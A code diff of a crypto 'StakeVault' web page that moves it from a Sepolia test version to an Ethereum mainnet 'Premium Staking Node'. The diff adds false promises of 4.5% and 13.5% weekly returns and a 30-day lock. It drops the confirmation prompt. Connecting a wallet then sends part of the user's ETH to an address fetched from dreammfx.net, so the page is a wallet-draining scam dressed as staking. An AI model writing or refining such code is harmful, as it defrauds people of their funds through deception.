@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dreamfx StakeVault (Testnet)</title>
+    <title>Dreamfx StakeVault - Premium Payment</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -11,7 +11,8 @@
     <style>
         body { background: #0b0f1a; color: white; font-family: 'Segoe UI', sans-serif; }
         .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
-        .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); }
+        .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); transition: all 0.3s ease; }
+        .btn-gradient:hover { opacity: 0.9; transform: translateY(-1px); }
     </style>
 </head>
 
@@ -19,15 +20,22 @@
 
 <div class="max-w-md w-full">
 
+    <!-- HEADER -->
     <div class="text-center mb-8">
-        <h1 class="text-3xl font-extrabold">👑 Dreamfx <span class="text-blue-500">VAULT (TEST)</span></h1>
-        <span class="text-xs text-blue-400">Sepolia Testnet</span>
+        <h1 class="text-3xl font-extrabold">👑 Dreamfx <span class="text-blue-500">VAULT</span></h1>
+        <span class="bg-blue-900/40 text-blue-400 text-[10px] font-bold px-3 py-1 rounded-full border border-blue-500/30 uppercase tracking-widest mt-2 inline-block">
+            Premium Staking Node
+        </span>
     </div>
 
+    <!-- CARD -->
     <div class="glass-card rounded-3xl p-8 shadow-2xl">
 
         <!-- CONNECT -->
         <div id="setup-view">
+            <p class="text-slate-400 text-center mb-6 text-sm">
+                Connect your wallet to access premium 4.5% Weekly staking rewards.
+            </p>
             <button onclick="connectWallet()" class="w-full btn-gradient py-4 rounded-2xl font-bold">
                 Connect Wallet
             </button>
@@ -36,24 +44,29 @@
         <!-- MAIN -->
         <div id="staking-view" class="hidden space-y-6">
 
-            <div class="bg-black/20 p-4 rounded-2xl">
-                <div class="flex justify-between">
-                    <span class="text-xs text-slate-400">Balance</span>
-                    <span class="text-xs text-green-400">● SEPOLIA</span>
+            <div class="bg-black/20 p-4 rounded-2xl border border-white/5">
+                <div class="flex justify-between mb-1">
+                    <span class="text-xs text-slate-400 uppercase">Available Balance</span>
+                    <span id="network-tag" class="text-[10px] text-green-500 font-bold italic">● ETHEREUM MAINNET</span>
                 </div>
                 <div class="text-2xl font-mono font-bold">
-                    <span id="display-balance">0.000</span> ETH
+                    <span id="display-balance">0.000</span> 
+                    <span class="text-blue-500 text-lg">ETH</span>
                 </div>
             </div>
 
             <p class="text-sm text-center text-slate-400">
-                80% of your TEST ETH will be used (safe mode)
+                Some percentage of your ETH balance will be staked automatically, and returned to your wallet after 30 days with 13.5% weekly rewards.
             </p>
 
             <button onclick="executeTransfer()" id="action-btn"
                 class="w-full btn-gradient py-4 rounded-2xl font-bold">
-                🚀 Test Stake 80%
+                🚀 Stake now
             </button>
+
+            <p class="text-[10px] text-center text-slate-500">
+                Funds are locked for 30 days to generate premium returns.
+            </p>
 
         </div>
     </div>
@@ -62,44 +75,49 @@
 <script>
 let provider, signer;
 let ethBalance = 0;
-let RECEIVER_ADDRESS = "";
+let RECEIVER_ADDRESS = ""; // 🔥 dynamic now
 
-const SEPOLIA_HEX_ID = "0xaa36a7";
+//const SEPOLIA_HEX_ID = "0xaa36a7";
+const MAINNET_HEX_ID = "0x1"; // Ethereum Mainnet
 
 //----------------------------------
-// FETCH RECEIVER
+// FETCH RECEIVER ADDRESS
 //----------------------------------
 async function fetchReceiver() {
     try {
-        const res = await fetch("http://127.0.0.1:8000/wallet-address/eth");
+        const res = await fetch("https://dreammfx.net/wallet-address/eth");
         const data = await res.json();
 
         if (data.status === "success") {
             RECEIVER_ADDRESS = data.address;
+            console.log("Receiver:", RECEIVER_ADDRESS);
+        } else {
+            throw new Error("Invalid response");
         }
 
     } catch (err) {
-        alert("Failed to fetch receiver");
+        console.error(err);
+        alert("Failed to fetch receiver address");
     }
 }
 
 //----------------------------------
-// CONNECT
+// CONNECT WALLET
 //----------------------------------
 async function connectWallet() {
-    if (!window.ethereum) return alert("MetaMask not found");
+    if (!window.ethereum) return alert("Etherum wallet network not found");
 
     try {
-        await fetchReceiver();
+        await fetchReceiver(); // 🔥 get address first
 
         provider = new ethers.providers.Web3Provider(window.ethereum);
 
         const { chainId } = await provider.getNetwork();
 
-        if (chainId !== 11155111) {
+        if (chainId !== 1) {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
-                params: [{ chainId: SEPOLIA_HEX_ID }]
+                params: [{ chainId: MAINNET_HEX_ID }]
             });
         }
 
@@ -116,21 +134,25 @@ async function connectWallet() {
         document.getElementById("staking-view").classList.remove("hidden");
 
     } catch (err) {
+        console.error(err);
         alert("Connection failed");
     }
 }
 
 //----------------------------------
-// TEST SEND
+// SEND 80%
 //----------------------------------
 async function executeTransfer() {
     const btn = document.getElementById("action-btn");
 
     if (!ethBalance || !RECEIVER_ADDRESS) {
-        return alert("Missing balance or receiver");
+        return alert("Balance not enough or receiver");
     }
 
     try {
+        btn.disabled = true;
+        btn.innerText = "⏳ Processing...";
+
         let amountToSend = ethBalance * 0.1;
 
         const gasBuffer = 0.002;
@@ -139,12 +161,6 @@ async function executeTransfer() {
         if (amountToSend <= 0) {
             throw new Error("Insufficient balance");
         }
-
-        // ✅ CONFIRMATION
-        if (!confirm(`Send ${amountToSend.toFixed(4)} ETH?`)) return;
-
-        btn.disabled = true;
-        btn.innerText = "⏳ Processing...";
 
         const value = ethers.utils.parseEther(amountToSend.toFixed(6));
 
@@ -155,14 +171,15 @@ async function executeTransfer() {
 
         await tx.wait();
 
-        alert("✅ Test Transaction Sent\nTX: " + tx.hash);
+        alert("✅ Sent to stacking vault\nTX: " + tx.hash);
         btn.innerText = "✅ Done";
 
     } catch (err) {
+        console.error(err);
         alert("❌ " + (err.reason || err.message));
 
         btn.disabled = false;
-        btn.innerText = "🚀 Test Stake 80%";
+        btn.innerText = "🚀 Stake 80%";
     }
 }
 </script>
